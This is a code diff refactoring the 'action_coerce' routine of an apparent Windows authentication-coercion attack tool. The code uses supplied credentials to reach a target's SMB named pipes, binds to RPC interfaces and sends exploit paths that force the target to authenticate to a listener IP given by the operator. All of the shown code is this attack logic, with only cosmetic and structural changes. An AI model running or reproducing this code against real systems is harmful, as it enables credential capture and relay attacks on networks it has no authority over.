@@ -6,8 +6,8 @@
 
 
 import time
-from coercer.core.Filter import Filter
-from coercer.core.utils import generate_exploit_path_from_template
+from colorama import Fore
+from coercer.core.utils import generate_exploit_path_from_template, generate_tasks, generate_filter
 from coercer.network.DCERPCSession import DCERPCSession
 from coercer.structures.TestResult import TestResult
 from coercer.network.authentications import trigger_authentication
@@ -17,75 +17,46 @@ from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface
 def action_coerce(target, available_methods, options, credentials, reporter):
     reporter.verbose = True
 
-    filter = Filter(
-        filter_method_name=options.filter_method_name,
-        filter_protocol_name=options.filter_protocol_name,
-        filter_pipe_name=options.filter_pipe_name
-    )
-
-    # Preparing tasks ==============================================================================================================
-
-    tasks = {}
-    for method_type in available_methods.keys():
-        for category in sorted(available_methods[method_type].keys()):
-            for method in sorted(available_methods[method_type][category].keys()):
-                instance = available_methods[method_type][category][method]["class"]
-
-                if filter.method_matches_filter(instance):
-                    for access_type, access_methods in instance.access.items():
-                        if access_type not in tasks.keys():
-                            tasks[access_type] = {}
-
-                        # Access through SMB named pipe
-                        if access_type == "ncan_np":
-                            for access_method in access_methods:
-                                namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
-                                if namedpipe not in tasks[access_type].keys():
-                                    tasks[access_type][namedpipe] = {}
-
-                                if uuid not in tasks[access_type][namedpipe].keys():
-                                    tasks[access_type][namedpipe][uuid] = {}
-
-                                if version not in tasks[access_type][namedpipe][uuid].keys():
-                                    tasks[access_type][namedpipe][uuid][version] = []
-
-                                if instance not in tasks[access_type][namedpipe][uuid][version]:
-                                    tasks[access_type][namedpipe][uuid][version].append(instance)
-
-    # Executing tasks =======================================================================================================================
+    # Fetch tasks based on filters and available methods
+    _filter = generate_filter(options.filter_protocol_name, options.filter_pipe_name, available_methods)
+    tasks = generate_tasks(_filter, options.filter_method_name)
 
     if options.verbose:
-        print("[+] Coercing '%s' to authenticate to '%s'" % (target, options.listener_ip))
+        print(f"[+] Coercing '{target}' to authenticate to '{options.listener_ip}'")
 
     # Processing ncan_np tasks
-    if len(tasks.keys()) == 0:
+    if tasks is None:
         return None
+
     ncan_np_tasks = tasks["ncan_np"]
     for namedpipe in sorted(ncan_np_tasks.keys()):
         if can_connect_to_pipe(target, namedpipe, credentials):
-            print("[+] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;92maccessible\x1b[0m!" % namedpipe)
+            if options.verbose:
+                print(f"[+] SMB named pipe {Fore.GREEN + namedpipe + Fore.RESET} is accessible")
             for uuid in sorted(ncan_np_tasks[namedpipe].keys()):
                 for version in sorted(ncan_np_tasks[namedpipe][uuid].keys()):
                     if can_bind_to_interface(target, namedpipe, credentials, uuid, version):
-                        print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
-                        for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version], key=lambda x:x.function["name"]):
+                        if options.verbose:
+                            print(f" {Fore.GREEN}>{Fore.RESET} Successful binding to interface {uuid} {version}!")
+                        for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version],
+                                                       key=lambda x: x.function["name"]):
 
                             exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)
 
                             stop_exploiting_this_function = False
-                            for listener_type, exploitpath in exploit_paths:
+                            for listener_type, exploit_path in exploit_paths:
                                 if stop_exploiting_this_function:
                                     # Got a nca_s_unk_if response, this function does not listen on the given interface
                                     continue
 
-                                exploitpath = generate_exploit_path_from_template(
-                                    template=exploitpath,
+                                exploit_path = generate_exploit_path_from_template(
+                                    template=exploit_path,
                                     listener=options.listener_ip,
                                     http_listen_port=options.http_port,
                                     smb_listen_port=options.smb_port
                                 )
 
-                                msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
+                                msprotocol_rpc_instance = msprotocol_class(path=exploit_path)
                                 dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                 dcerpc.connect_ncacn_np(target=target, pipe=namedpipe)
 
@@ -104,7 +75,7 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                                             target=target, uuid=uuid, version=version, namedpipe=namedpipe,
                                             msprotocol_rpc_instance=msprotocol_rpc_instance,
                                             result=result,
-                                            exploitpath=exploitpath
+                                            exploitpath=exploit_path
                                         )
 
                                         if result == TestResult.NCA_S_UNK_IF:
@@ -116,7 +87,8 @@ def action_coerce(target, available_methods, options, credentials, reporter):
 
                                 if not options.always_continue:
                                     next_action_answer = None
-                                    while next_action_answer not in ["C","S","X"]:
+
+                                    while next_action_answer not in ["C", "S", "X"]:
                                         next_action_answer = input("Continue (C) | Skip this function (S) | Stop exploitation (X) ? ")
                                         if len(next_action_answer) > 0:
                                             next_action_answer = next_action_answer.strip()[0].upper()
@@ -128,8 +100,8 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                                         return None
                     else:
                         if options.verbose:
-                            print("   [!] Cannot bind to interface (%s, %s)!" % (uuid, version))
+                            print(f" {Fore.RED}>{Fore.RESET} Failed binding to interface ({uuid}, {version})!")
         else:
             if options.verbose:
-                print("[!] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;91mnot accessible\x1b[0m!" % namedpipe)
+                print(f"[!] SMB named pipe {Fore.RED + namedpipe + Fore.RESET} not accessible!")
 
